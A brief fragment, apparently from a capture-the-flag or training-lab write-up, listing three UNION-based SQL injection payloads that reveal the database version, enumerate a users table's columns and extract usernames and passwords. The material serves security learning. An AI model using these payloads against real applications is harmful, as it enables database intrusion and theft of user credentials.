...
**Payload:** `?category=Tech+gifts%27+UNION+SELECT+version(),+NULL--`
...
**Payload:** `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users_nuhelf'--`
...
**Payload:** `' UNION SELECT username_wfhktn, password_vbtbdm FROM users_nuhelf--`
